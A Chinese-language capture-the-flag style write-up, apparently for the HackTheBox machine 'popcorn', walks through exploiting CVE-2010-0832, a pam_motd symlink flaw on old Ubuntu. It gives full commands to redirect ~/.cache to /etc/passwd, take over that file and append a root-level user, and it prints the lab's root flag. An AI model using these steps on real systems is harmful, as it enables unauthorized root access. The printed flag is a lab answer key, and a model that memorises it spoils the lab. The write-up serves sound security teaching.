权限提升 CVE-2010-0832 PAM motd 符号链接提权

漏洞原理

CVE-2010-0832 是 Linux PAM 中 pam_motd（Message of the Day）模块的本地提权漏洞。

当用户通过 login shell（SSH 登录、su - 等）登录时，PAM 会处理 ~/.cache/motd.legal-displayed 文件。如果 ~/.cache 目录不存在，PAM 会自动创建它，并将文件的所有者设置为当前登录用户。

攻击链：删除 ~/.cache → 创建指向 /etc/passwd 的符号链接 → SSH 登录触发 PAM → PAM 将 /etc/passwd 所有者改为 www-data → 追加 UID=0 用户。

🧒 儿童版：每次你用 SSH 登录，系统都会在你的"缓存文件夹"里放一个小标记文件，并标注"这是你的"。如果你把缓存文件夹偷偷替换成一个指向 /etc/passwd 的"路标"，系统就会跑去 /etc/passwd 上标注"这是你的"——你就拥有了密码文件的控制权。

步骤一：在目标机准备 SSH 密钥

www-data 的家目录是 /var/www：

cd /var/www
mkdir .ssh
cd .ssh

# 生成密钥对
ssh-keygen -q -t rsa -N '' -C 'pam'

# 设置 authorized_keys
cp id_rsa.pub authorized_keys
chmod 600 authorized_keys

# 查看私钥（复制到攻击机）
cat id_rsa

步骤二：从攻击机 SSH 登录（第一次，触发 .cache 生成）

# 保存私钥
nano /tmp/www-data_key
chmod 600 /tmp/www-data_key

# SSH 登录（老系统需要启用旧算法）
ssh -i /tmp/www-data_key \
  -o HostKeyAlgorithms=+ssh-rsa \
  -o PubkeyAcceptedAlgorithms=+ssh-rsa \
  www-data@10.129.55.97

登录成功后 PAM 自动创建了 /var/www/.cache/motd.legal-displayed。

步骤三：创建符号链接

cd /var/www

# 删除 .cache 目录
rm -rf .cache

# 创建指向 /etc/passwd 的符号链接
ln -s /etc/passwd .cache

# 验证
ls -la .cache
# .cache -> /etc/passwd

步骤四：再次 SSH 登录（触发 PAM 改所有权）

从攻击机再次执行相同的 SSH 命令。登录后验证：

ls -l /etc/passwd
# -rw-r--r-- 1 www-data www-data ...

/etc/passwd 的所有者已经变成 www-data。

步骤五：追加 root 用户

# 生成密码哈希
openssl passwd -1 max
# $1$EZsBDvcS$zr/vPLUtgFNU.DG5ihwIe0

# 追加到 /etc/passwd（UID=0, GID=0 = root 权限）
echo 'max:$1$EZsBDvcS$zr/vPLUtgFNU.DG5ihwIe0:0:0:pwned:/root:/bin/bash' >> /etc/passwd

步骤六：切换到 root

su max
# 密码: max
root@popcorn:~# id
uid=0(root) gid=0(root) groups=0(root)

root@popcorn:~# cat root.txt
9cff9b69b5ac43d16c92519fa443ee19

⚠️ 踩坑提醒

反弹 shell 不会触发 PAM，必须通过真正的 SSH login shell 才能触发 motd 处理

现代 Kali 的 OpenSSH 默认禁用了 ssh-rsa 算法，连接老系统必须加 -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa

符号链接必须在第一次 SSH 登录后、第二次 SSH 登录前创建

这个漏洞只影响旧版 Ubuntu（约 2010 年前），现代系统已修复

额外知识

/etc/passwd 追加 root 用户

/etc/passwd 中每行的格式为：用户名:密码哈希:UID:GID:描述:家目录:Shell

当 UID 设为 0 时，该用户等同于 root。即使 /etc/shadow 存在，/etc/passwd 中的密码字段如果非空，系统会优先使用它。所以直接在 /etc/passwd 中追加一行 UID=0 的用户就能获得 root 权限。

PAM（Pluggable Authentication Modules）

PAM 是 Linux 的认证框架，所有登录行为（SSH、su、sudo、login）都通过 PAM 模块链处理。pam_motd 模块负责在登录时显示"每日消息"（Message of the Day）。CVE-2010-0832 的根本原因是 pam_motd 在创建/修改 ~/.cache 目录下的文件时，以 root 权限运行但将文件所有权设为登录用户，结合符号链接就可以劫持任意文件的所有权。
